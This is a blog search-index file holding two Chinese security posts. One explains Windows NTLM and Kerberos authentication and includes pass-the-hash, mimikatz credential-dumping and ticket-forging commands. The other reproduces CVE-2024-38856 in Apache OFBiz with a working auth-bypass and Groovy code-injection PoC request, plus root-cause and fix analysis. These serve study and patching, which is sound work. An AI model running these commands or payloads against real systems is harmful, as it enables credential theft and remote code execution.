<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Windows认证机制</title>
      <link href="/2024/09/19/Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/"/>
      <url>/2024/09/19/Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows认证机制"><a href="#Windows认证机制" class="headerlink" title="Windows认证机制"></a>Windows认证机制</h1><p>​Windows 的认证机制也是一项基础，通过本文你能大致了解Windows认证机制，其中涉及常见的名词如NTLM哈希，PTH ,Kerberos协议，黄金票据、白银票据等等，希望师傅们看完能基本了解其含义和及其原理 </p><h2 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h2><p>密码存储路径：%SystemRoot%\system32\config\sam</p><h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>NTLM Hash 是长度为32位由数字和字母组成的hash，支持Net NTLM 认证协议及本地认证</p><ul><li>Windows本身不存储用户的明文密码</li><li>当用户登录时候，会与本地SAM中的NTLM hash进行比较</li><li>在NTLM Hash 之前还存在LM Hash</li></ul><p><strong>生成</strong></p><img src="/img/24-9-19/1.png"><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> passlib<span class="token punctuation">.</span><span class="token builtin">hash</span> <span class="token keyword">import</span> nthashh<span class="token operator">=</span>nthash<span class="token punctuation">.</span><span class="token builtin">hash</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span></code></pre><p>计算过程</p><p>如计算 admin的 NTLM Hash</p><ol><li>hex(16进制编码)  -&gt; 61646d696e</li><li>Unicode  -&gt; 610064006d0069006e00</li><li>MD4   -&gt; 209c6174da490caeb422f3fa5a7ae634</li></ol><h3 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h3><ol><li>Windows Logon Process (即 winlogon.exe),是Windows NT 用户登录程序，用于管理用户登录和退出</li><li>LSASS 用于微软Windows系统的安全机制。用于本地安全和登录策略</li></ol><h3 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h3><p><strong>计算过程</strong></p><ol><li>将所有小写字母转为大写字母</li><li>将密码转为16进制，分两组，填充为14个字符，空余位使用0x00字符填补</li><li>将密码分割为两个7个字节的的块</li><li>将每组转化为比特流，不足58bit的时候在左边加0</li><li>将比特流按照7比特一组，分出8组，末尾加0</li><li>将每组转化为16进制作为被加密的值，使用DES加密，使用字符串”KGS!@#%” 作为Key(0x4B47532140232425)，得到8个结果，每个结果转化为16进制</li></ol><p>若密码不超过7字节，后面一半是固定的：AA-D3-B4-35-B5-14-04-EE</p><ol start="7"><li>连接两个加密字符串，得到LM哈希</li></ol><h2 id="Windows-网络认证"><a href="#Windows-网络认证" class="headerlink" title="Windows 网络认证"></a>Windows 网络认证</h2><p><strong>背景</strong>：</p><p>在内网渗透中，经常会遇到工作组，工作组环境是一个逻辑上的网络环境(工作区) ，隶属于工作组的机器之间违法相互建立一个完美的信任机制，只能点对点，是比较落后的认知方式，没有信任机构</p><p>假设A主机与B主机属于同一个工作组环境，A想访问B上面的资源，需要将一个存在于B主机上的账户凭证发送给B,经过认证才能访问B</p><p>常见的服务：SMB服务  端口445</p><h3 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h3><p>即NT LAN Manager协议</p><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>早期的SMB协议在网络传输明文口令，后来出现LAN Manager Challenge/Response 验证机制，简称LM，但因为简单很容易就会被破解</p><p>后面提出了WindowsNT挑战/响应验证机制，称之为NTLM 。现在已经有了更新的NTLMv2以及Kerberos验证体系</p><h4 id="Challenge-Response"><a href="#Challenge-Response" class="headerlink" title="Challenge/Response"></a>Challenge/Response</h4><ol><li><strong>第一步 协商</strong></li></ol><p>客户端在这一步向服务器确认协议版本，是v1还是v2 …</p><ol start="2"><li><strong>第二步 质询</strong><ol><li>客户端向服务端发送用户信息（用户名）请求</li></ol></li></ol><p>(如果没有，认证失败，如果有生成Chanllenge)</p><p>服务器接收到请求后生成一个16位的随机数，称之为“Challenge” 使用登录用户名对应的NTLM Hash加密加密 Challenge 生成Challenge1。同时，生成Challenge1后，将Challenge(16位随机字符）发送给客户端   // <font style="color:#DF2A3F;">Net NTLM Hash = NTLM Hash( Challenge)</font></p><p>客户端接收到Challenge后，使用将要登录到账户对应的NTLM Hash加密Challenge生成Response ,然后将Response发送到服务端,这个Response 也就是Net-NTLM Hash</p><ol start="3"><li><strong>第三步 验证</strong></li></ol><p>服务端收到客户端的Response后，比对Chanllenge1与Response是否相等，若相等，则认证通过</p><p>注意：每一次产生的Chanllenge都不同</p><p>流程如图：</p><img src="/img/24-9-19/2.png"><h4 id="NTLM-v2-协议"><a href="#NTLM-v2-协议" class="headerlink" title="NTLM v2 协议"></a>NTLM v2 协议</h4><p>NTLM v1 与NTLM v2 最显著的区别就是Challenge 与加密算法不同，共同点就是加密的原料都是NTLM Hash</p><p><strong>差异</strong></p><ul><li>Chanllenge v1 的是有8位 ，v2的有16位</li><li>Net-NTLM Hash:  加密算法 v1使用的DES ,v2的加密算法主要是HMAC-MD5</li></ul><h4 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h4><p>即PTH  (哈希传递)</p><p><strong>介绍</strong></p><p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术</p><p>在获取不到明文密码，破解不了NTLM Hash的情况下进行横向移动</p><p><strong>条件</strong></p><ul><li><font style="color:#DF2A3F;">被认证的主机能够访问到服务器</font></li><li><font style="color:#DF2A3F;">需要知道被传递认证的用户名</font></li><li><font style="color:#DF2A3F;">需要被传递认证用户的NTLM Hash</font></li></ul><p><font style="color:#DF2A3F;"></font></p><p><strong>原理</strong></p><p><font style="color:#DF2A3F;"> </font>其实知道了NTLM协议的认证的流程，原理就很简单，发送给服务端的Resposne是通过NTLM Hash 和 Chanllenge 生成的，因此直接使用Hash 就可以生成正确的Response</p><p> 这也是正常的NTLM 认证流程</p><p><strong>工具</strong></p><p><strong>常见的工具有：</strong></p><ul><li>Smbmap</li><li>CrackMapExec</li><li>Smbexec</li><li>Metasploit</li><li>……..</li></ul><p>如使用CrackMapExec</p><pre class="language-bash" data-language="bash"><code class="language-bash">cme smb <span class="token number">192.168</span>.3.5 <span class="token parameter variable">-u</span> administrator <span class="token parameter variable">-H</span> dab7de8feecac65faf9fdc6cac3a9 <span class="token parameter variable">-x</span> <span class="token function">whoami</span></code></pre><hr><h2 id="域认证"><a href="#域认证" class="headerlink" title="域认证"></a>域认证</h2><h3 id="Kerberoes协议"><a href="#Kerberoes协议" class="headerlink" title="Kerberoes协议"></a>Kerberoes协议</h3><h4 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h4><p><strong>概念</strong></p><p>Active Directory存储了有关网络对象的信息，并且让管理员能快速查找和使用这些信息。Active Directory 使用了结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织</p><p><font style="color:#DF2A3F;background-color:rgb(249, 250, 251);">网络对象分为：用户、用户组、计算机、域、组织单位以及安全策略等</font></p><p><strong>作用</strong></p><p>服务器及其客户端计算机管理、用户管理、资源管理、桌面配置、应用系统支撑</p><h4 id="Kerberoes"><a href="#Kerberoes" class="headerlink" title="Kerberoes"></a>Kerberoes</h4><p>Kerberos是一种网络认证协议，设计目标是通过密钥系统为客户机和服务器应用程序提供认证服务。无需基于主机地址的信任，不需要网络上所有主机的网络安全。并假定网络上传送的数据包可以被任意读取、修改插入数据。在上面情况下，Kerberos作为一种可信任的第三方认证服务，通过传统的密码技术（共享密钥）执行认证服务</p><p>涉及到三个角色：Client、Server、KDC(Key Distribution Center) = DC (域控)</p><p><strong>KDC</strong></p><ul><li>AD (account database):存储所有client的白名单，只有存在于白名单的Client才能顺利申请到TGT</li><li>Authentication Service( AS ): 为client 生成TGT的服务</li><li>Ticket Grantig Service（TGS）: 为Client 生成某个服务的ticket 的服务</li></ul><p>关系如图：<img src="/img/24-9-19/3.png"></p><p><strong><font style="color:#DF2A3F;">域认证流程</font></strong></p><p><strong><font style="color:#DF2A3F;"></font></strong></p><p><em><strong><font style="color:#262626;">其中涉及 的密钥加密一般都是 使用对应机器的 NTLM Hash 加密</font></strong></em></p><p><em><strong><font style="color:#262626;"></font></strong></em></p><p><strong><font style="color:#262626;">第一次通信</font></strong></p><p><font style="color:#262626;">概述：</font><em><font style="color:#262626;">client 向 kerberos 服务请求，希望获取访问权限，kerberos 服务器首先判断client是否可信，也就是通过白名单和黑名单，通过后AS返回TGT给client</font></em></p><img src="/img/24-9-19/4.png"><p>具体流程：</p><p><strong><font style="color:rgb(85, 85, 85);">①</font></strong><font style="color:rgb(85, 85, 85);"> 客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的</font><strong><font style="color:rgb(85, 85, 85);">用户名，主机IP，和当前时间戳</font></strong><font style="color:rgb(85, 85, 85);">；（AS_REQ）<br></font><strong><font style="color:rgb(85, 85, 85);">②</font></strong><font style="color:rgb(85, 85, 85);"> KDC当中的AS（Authentication Server）接收请求（AS是KDC中专门用来认证客户端身份的认证服务器）后去kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可靠性；<br></font><strong><font style="color:rgb(85, 85, 85);">③</font></strong><font style="color:rgb(85, 85, 85);"> 如果没有该用户名，认证失败，服务结束；如果存在该用户名，则AS认证中心便认为用户存在，此时便会返回响应给客户端，其中包含两部分内容：</font></p><ul><li><font style="color:rgb(85, 85, 85);">第一部分内容称为TGT，他叫做票据授予票据，客户端后面的流程需要使用TGT去KDC中的TGS（票据授予中心）获取访问网络服务所需的Ticket（服务授予票据），TGT中包含的内容有kerberos数据库中存在的该</font><strong><font style="color:rgb(85, 85, 85);">客户端的Name，IP，当前时间戳，客户端<br></font>****<font style="color:rgb(85, 85, 85);">即将访问的TGS的Name，TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)</font></strong><font style="color:rgb(85, 85, 85);">。整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况。</font></li><li><font style="color:rgb(85, 85, 85);">第二部分内容是使用客户端密钥（域控默认存储了所有机器的密钥，client,server）加密的一段内容，其中包括用于</font><strong><font style="color:rgb(85, 85, 85);">客户端和TGS间通信的Session_key(CT_SK),客户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳</font></strong><font style="color:rgb(85, 85, 85);">。该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。</font></li></ul><p><font style="color:rgb(85, 85, 85);">至此，第一次通信完成。</font></p><p><strong>第二次通信</strong></p><p>概述：<em>client 得到了TGT 后 继续向kerberos请求 ,希望获取server的权限，kerberos通过TGT 判断client是否拥有权限，然后给client访问server的权限的ticket</em></p><img src="/img/24-9-19/5.png"> <p>具体流程：</p><p><font style="color:rgb(85, 85, 85);">客户端行为：<br></font><strong><font style="color:rgb(85, 85, 85);">①</font></strong><font style="color:rgb(85, 85, 85);"> 客户端使用CT_SK (</font><strong><font style="color:rgb(85, 85, 85);">SessionKey</font></strong><font style="color:rgb(85, 85, 85);">)加密将自己的客户端信息发送给KDC，其中包括客户端名，IP，时间戳；<br></font><strong><font style="color:rgb(85, 85, 85);">②</font></strong><font style="color:rgb(85, 85, 85);"> 客户端将自己想要访问的Server服务以明文的方式发送给KDC；<br></font><strong><font style="color:rgb(85, 85, 85);">③</font></strong><font style="color:rgb(85, 85, 85);"> 客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC；</font></p><font style="color:rgb(85, 85, 85);">  </font><font style="color:rgb(85, 85, 85);">TGS行为：  </font>**<font style="color:rgb(85, 85, 85);">①</font>**<font style="color:rgb(85, 85, 85);"> 此时KDC中的TGS（票据授予服务器）收到了来自客户端的请求。他首先根据客户端明文传输过来的Server服务IP查看当前kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束。如果存在，继续接下来的认证。  </font>**<font style="color:rgb(85, 85, 85);">②</font>**<font style="color:rgb(85, 85, 85);"> TGS使用自己的密钥将TGT中的内容进行解密，此时他看到了经过AS认证过后并记录的用户信息，一把Session_KEY即CT_SK，还有时间戳信息，他会现根据时间戳判断此次通信是否真是可靠有无超出时延。  </font>**<font style="color:rgb(85, 85, 85);">③</font>**<font style="color:rgb(85, 85, 85);"> 如果时延正常，则TGS会使用CK_SK对客户端的第一部分内容进行解密（使用CT_SK加密的客户端信息），取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。  </font>**<font style="color:rgb(85, 85, 85);">④</font>**<font style="color:rgb(85, 85, 85);"> 此时KDC将返回响应给客户端，响应内容包括：</font><ul><li><font style="color:rgb(85, 85, 85);">第一部分：用于客户端访问网络服务的使用Server密码加密的ST（Servre Ticket），其中包括客户端的Name，IP，需要访问的网络服务的地址Server IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信的CS_SK（Session Key）。</font></li><li><font style="color:rgb(85, 85, 85);">第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，AS已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以自己解密的。</font></li></ul><p><font style="color:rgb(85, 85, 85);">至此，第二次通信完成。</font></p><p><strong>第三次通信</strong></p><p>概述：_<font style="color:rgb(85, 85, 85);">此时的客户端收到了来自KDC（TGS）的响应，并使用缓存在本地的CT_SK解密了第二部分内容（第一部分内容中的ST是由Server密码加密的，客户端无法解密），检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请求。</font>_</p><img src="/img/24-9-19/6.png"><p><em><font style="color:rgb(85, 85, 85);"></font></em></p><p><strong>具体流程</strong></p><p><font style="color:rgb(85, 85, 85);">客户端：<br></font><strong><font style="color:rgb(85, 85, 85);">①</font></strong><font style="color:rgb(85, 85, 85);"> 客户端使用CK_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST（服务授予票据）作为第二部分内容都发送给服务端。<br></font></p><p><font style="color:rgb(85, 85, 85);">服务端：<br></font><strong><font style="color:rgb(85, 85, 85);">①</font></strong><font style="color:rgb(85, 85, 85);"> 服务器此时收到了来自客户端的请求，他会使用自己的密钥，即Server密钥将客户端第二部分内容进行解密，核对时间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时他将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过了KDC认证的具有真实身份的客户端，是他可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份（其实服务端在通信的过程中还会使用数字证书证明自己身份）。</font></p><p><font style="color:rgb(85, 85, 85);">至此，第三次通信完成。此时也代表着整个kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以放心的进行整个网络通信了。</font></p><p><strong>总结</strong></p><p><font style="color:rgb(85, 85, 85);">整个kerberos认证的过程较为复杂，三次通信中都使用了密钥，且密钥的种类一直在变化，并且为了防止网络拦截密钥，这些密钥都是临时生成的Session Key，即他们只在一次Session会话中起作用，即使密钥被劫持，等到密钥被破解可能这次会话都早已结束。<br></font><font style="color:rgb(85, 85, 85);">这为整个kerberos认证过程保证了较高的安全性。以下补充两个kerberos认证的整体流图，一个是kerberos认证的时序图，一个是kerberos认证的示意图，望能加深kerberos认证印象~~<br></font><font style="color:rgb(85, 85, 85);">示意图：</font></p><img src="/img/24-9-19/7.png"> <img src="/img/24-9-19/8.png"> <h4 id="白银票据（Silver-Ticket）"><a href="#白银票据（Silver-Ticket）" class="headerlink" title="白银票据（Silver Ticket）"></a>白银票据（Silver Ticket）</h4><p>特点：</p><ul><li>不需要域KDC进行交互,(不需要拥有域账号)</li><li>需要知道目标服务的（对应计算机名的）NTLM Hash （条件）</li><li>只能针对对应的一个服务，不能访问所有的服务</li></ul><p>概述：Ticket = Server Hash ( Server Session Key + Client Info + end Time )</p><p>当拥有Server Hash  时候,我们就可以伪造一个KDC认证的一个Ticket.</p><p>其中Server Session Key 是 KDC 生成的 用于服务器和客户端通信的会话key,也就是随机字符串，所以可以进行任意伪造</p><p><strong>伪造</strong></p><p>Mimikatz</p><ul><li>kerberos::list :列出票据</li><li>kerberos::purge  :清除票据</li></ul><pre class="language-plain" data-language="plain"><code class="language-plain">mimikazt.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" &gt;log.txt</code></pre><p>伪造票据： mimikatz “kerberod::golden  /domain:&lt;域名&gt; /sid:&lt;域sid&gt; /target:&lt;目标服务器主机名&gt;  /service:&lt;服务类型&gt;  /rc4:<ntlm hash=""> /user:&lt;用户名&gt; /ptt” exit</ntlm></p><ul><li>(/ptt 注入到内存)</li><li>用户名可以随意</li></ul><p>只能针对服务器上面的某些服务进行伪造，伪造服务类型如下：</p><img src="/img/24-9-19/9.png"><p><strong>防御</strong></p><ul><li>尽量保证服务器凭证不被窃取</li><li>开启PAC（Privileged Attribute Certificate）特权属性证书保护功能，PAC主要是规定服务器将票据发送给kerberos服务，由kerberos服务验证票据是否有效</li></ul><p>开启方式：将注册表中HKEY_LOCAL_MACHINE\SYSTEM\CurrentControl\Lsa\Kerberos\Parameters中的ValidateKdcPacSignature 设置为1</p><h4 id="黄金票据-Golden-Ticket"><a href="#黄金票据-Golden-Ticket" class="headerlink" title="黄金票据(Golden Ticket)"></a>黄金票据(Golden Ticket)</h4><p>特点/条件：</p><ol><li>需要与KDC通信</li><li>需要krbtgt 用户的hash (也就是KDC hash)</li></ol><p>可以不断伪造TGT，然后根据TGT 拿到对应的Ticket ,再去访问服务</p><p>伪造：mimikatz “kerberod::golden  /domain:&lt;域名&gt; /sid:&lt;域sid&gt;   /rc4:<krbtgt ntlm="" hash=""> /user:&lt;用户名&gt; /ptt” exit</krbtgt></p><h2 id="Access-Token"><a href="#Access-Token" class="headerlink" title="Access Token"></a>Access Token</h2><p>Access Token(访问令牌），它是一个描述进程或者线程安全上下文的一个对象。不同用户登录计算机后，都会生成一个Access Token ,这个Token 在用户创建进程或者线程时候会被使用，不断拷贝。（对应着A创建进程，而B无法访问）</p><p>种类：主令牌、模拟令牌</p><p>一般情况下，用户双击运行一个程序，都会拷贝explorer.exe的Access Token</p><p>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除</p><p><strong>组成</strong></p><ul><li>用户账户的安全标识符 （SID）</li><li>用户所属组的SID</li><li>用于标识当前登录会话的登录SID</li><li>用户或用户组所拥有的权限列表</li><li>所有者SID</li><li>访问控制列表</li><li>访问令牌的来源</li><li>令牌是主要令牌还是模拟令牌</li><li>限制SID的可选列表</li><li>目前的模拟等级</li><li>其他统计数据</li></ul><h4 id="SID"><a href="#SID" class="headerlink" title="SID"></a>SID</h4><p>Security Identifiers 安全标识符  是一个唯一的字符串，他可以表示一个账户、一个用户组、或者是一次登录。通常他还有一个SID固定列表，例如：Everyone</p><p>SID 的表现形式：</p><ol><li>域SID -用户ID</li><li>计算机SID-用户ID</li><li>SID列表都会存储在域控的AD或者计算机本地账户数据库中</li></ol><h4 id="Token-令牌伪造"><a href="#Token-令牌伪造" class="headerlink" title="Token 令牌伪造"></a>Token 令牌伪造</h4><p>Access Token 产生过程：</p><p>每个进程创建的时候会根据登录会话权限由LSA （Local Security Authority）分配一个Token （如果CreateProcess时自己指定了Token，LSA会用该Token,否则就用父进程Token 的一份拷贝）</p><p>只有计算机重启，才会清空令牌，那么可以使用多种工具查看目前系统上存在的模拟令牌：</p><ul><li>Incognito</li><li>Powershell -Invoke-TokenManipulation.ps1</li><li>Cobalt Strike -steal_token</li><li>Mimkatz 中的 token::list</li></ul><p>MSF 模块：</p><img src="/img/24-9-19/10.png"><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
            <tag> Windows安全 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache OFBiz目录遍历导致RCE(CVE-2024-38856)</title>
      <link href="/2024/08/09/Apache-OFBiz%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%AF%BC%E8%87%B4RCE-CVE-2024-38856/"/>
      <url>/2024/08/09/Apache-OFBiz%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E5%AF%BC%E8%87%B4RCE-CVE-2024-38856/</url>
      
        <content type="html"><![CDATA[<h1 id="Apache-OFBiz目录遍历导致RCE-CVE-2024-38856"><a href="#Apache-OFBiz目录遍历导致RCE-CVE-2024-38856" class="headerlink" title="Apache OFBiz目录遍历导致RCE(CVE-2024-38856)"></a>Apache OFBiz目录遍历导致RCE(CVE-2024-38856)</h1><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载地址： <a href="https://ofbiz.apache.org/download.html">https://ofbiz.apache.org/download.html</a><br>下载的是17.02版本（下载的是17.02版本（代码有点区别但是能复现漏洞，建议还是18版本） </p><p>然后在build.gradle 中设置jvm 调式参数</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span> jvmArguments <span class="token operator">=</span> <span class="token punctuation">[</span>'<span class="token operator">-</span><span class="token class-name">Xms128M</span><span class="token char">', '</span><span class="token operator">-</span><span class="token class-name">Xmx1024M</span><span class="token char">','</span><span class="token operator">-</span>agentlib<span class="token operator">:</span>jdwp<span class="token operator">=</span>transport<span class="token operator">=</span>dt_socket<span class="token punctuation">,</span>server<span class="token operator">=</span>y<span class="token punctuation">,</span>suspend<span class="token operator">=</span>n<span class="token punctuation">,</span>address<span class="token operator">=</span><span class="token number">5005</span>'<span class="token punctuation">]</span></code></pre><img src="/img/24-8-9/1.png"><p> 构建项目：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">.</span><span class="token operator">/</span>gradlew cleanAll loadAll</code></pre><p>这时候会编译出jar</p><p>直接运行</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">.</span><span class="token operator">/</span>gradlew ofbiz</code></pre><p>不需要等待到100%</p><p>访问：<a href="https://localhost:8443/accounting/control/main">https://localhost:8443/accounting/control/main</a></p><h3 id="poc"><a href="#poc" class="headerlink" title="poc:"></a>poc:</h3><pre class="language-powershell" data-language="powershell"><code class="language-powershell">POST <span class="token operator">/</span>webtools/control/forgotPassword<span class="token punctuation">;</span><span class="token operator">/</span>ProgramExport HTTP/1<span class="token punctuation">.</span>1Host:127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1:8443Accept-Encoding: gzip<span class="token punctuation">,</span> deflateAccept-Language: zh-CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q=0<span class="token punctuation">.</span>9<span class="token punctuation">,</span>en-US<span class="token punctuation">;</span>q=0<span class="token punctuation">.</span>8<span class="token punctuation">,</span>en<span class="token punctuation">;</span>q=0<span class="token punctuation">.</span>7Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5<span class="token punctuation">.</span>0 <span class="token punctuation">(</span>Windows NT 10<span class="token punctuation">.</span>0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537<span class="token punctuation">.</span>36 <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome/119<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0 Safari/537<span class="token punctuation">.</span>36 Edg/119<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0Content-<span class="token function">Type</span>: application/x-www-form-urlencoded Accept: text/html<span class="token punctuation">,</span>application/xhtml+xml<span class="token punctuation">,</span>application/xml<span class="token punctuation">;</span>q=0<span class="token punctuation">.</span>9<span class="token punctuation">,</span>image/webp<span class="token punctuation">,</span>image/apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q=0<span class="token punctuation">.</span>8<span class="token punctuation">,</span>application/signed-exchange<span class="token punctuation">;</span>v=b3<span class="token punctuation">;</span>q=0<span class="token punctuation">.</span>7Content-Length: 190groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0063\u0061\u006c\u0063\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b</code></pre><img src="/img/24-8-9/2.png">经过另外一位师傅的测试，不用; 和../../也可以<img src="/img/24-8-9/3.png"><p>groovy代码注入，早在2023年就出现过CVE:  CVE-2023-51467<br><a href="https://blog.csdn.net/qq_53003652/article/details/135311261">https://blog.csdn.net/qq_53003652/article/details/135311261</a></p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>在CVE-2023-51467  的基础上  进行unicode编码绕过<br>断点：groovyScripts/entity/ProgramExport.groovy<br><img src="/img/24-8-9/4.png"><br>跟进isValidText<br>黑名单检测：<br><img src="/img/24-8-9/5.png"><br><img src="/img/24-8-9/6.png"></p><p>搬了exec  所以 直接 execute 也是不行的<br>进行unicode编码，能进行绕过</p><h3 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h3><p>在一个ControlFilter的处理逻辑<br><img src="/img/24-8-9/7.png"></p><img src="/img/24-8-9/8.png"><p>在这里主要关注的点是为什么请求的是/webtools/control/forgotPassword/ProgramExport接口时，但是实际调用的是ProgramExport接口，而且能利用forgotPassword来绕过身份验证</p><p>具体的处理逻辑从webapp.control.ControlServlet#doGet()开始，该方法主要是做请求预处理，包括获取用户session信息、设置响应头，接着就会进入到RequestHandler.doRequest()</p><p>从代码上看，安全策略是由xml来配置的，找到相关配置文件：<br>webcommon/WEB-INF/common-controller.xml<br>在xml中获取request-map标签的相关信息，在security标签中保存了接口是否需要鉴权的信息，当该接口无需身份验证就能访问时auth的值就为false，从下图中我们可以看到forgotPassword是无需鉴权的<br><img src="/img/24-8-9/9.png"></p><p>requestMap对象属性为securityAuth，该属性的值是从commom-controller.xml中获取的，保存的是security标签里auth的值，如果为true 就会检查是否登录了<br><img src="/img/24-8-9/10.png"><br>再看看requestMap 怎么来的：<br><img src="/img/24-8-9/11.png"></p><p>也就是 取决于前面的defaultRequestUri</p><p>继续查看defaultRequestUri<br><img src="/img/24-8-9/12.png"></p><img src="/img/24-8-9/13.png">tomcat 是这么解析的，看到解析的时候忽略了;<img src="/img/24-8-9/14.png">这里取的是第一个元素，自然是forgotPassword<p>然而最后的view视图是取决于overrideViewUri<br><img src="/img/24-8-9/15.png"></p><img src="/img/24-8-9/16.png">与前面不同的是，这里会取第二个元素<img src="/img/24-8-9/17.png"><p>总结： 检查鉴权的是defaultRequestUri ( forgotPassword ) 而渲染视图的是 overrideViewUri（ProgramExport）<br>这样就绕过了登录检查，平常审计的时候也应该密切关注安全检查的策略</p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>来看看修复方式：<br><img src="/img/24-8-9/18.png"><br>filter里面就搬了;和./<br>此外还对接口脚本处，多增一处权限校验<br><img src="/img/24-8-9/19.png"></p><p>进一步的修复：<a href="https://github.com/apache/ofbiz-framework/commit/6c3b0068a99bb3b93321fdb983a0046b0679c86d">https://github.com/apache/ofbiz-framework/commit/6c3b0068a99bb3b93321fdb983a0046b0679c86d</a></p><p>就不跟了</p><p>Reference:</p><ul><li><a href="https://github.com/apache/ofbiz-framework/commit/d1eb477355">https://github.com/apache/ofbiz-framework/commit/d1eb477355</a></li><li><a href="https://xz.aliyun.com/t/14733?time__1311=GqAh7IqGrhkD/WNiQ=GQvE98xgAfAeD">https://xz.aliyun.com/t/14733?time__1311=GqAh7IqGrhkD%2FWNiQ%3DGQvE98xgAfAeD</a></li><li><a href="https://github.com/Mr-xn/CVE-2024-32113?tab=readme-ov-file">https://github.com/Mr-xn/CVE-2024-32113?tab=readme-ov-file</a></li><li><a href="https://forum.butian.net/share/3090">https://forum.butian.net/share/3090</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> cve复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 表达式注入 </tag>
            
            <tag> Apache </tag>
            
            <tag> web安全 </tag>
            
            <tag> cve </tag>
            
            <tag> Govvy </tag>
            
            <tag> 路径遍历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springcloud dataflow任意文件写入（CVE-2024-22263）</title>
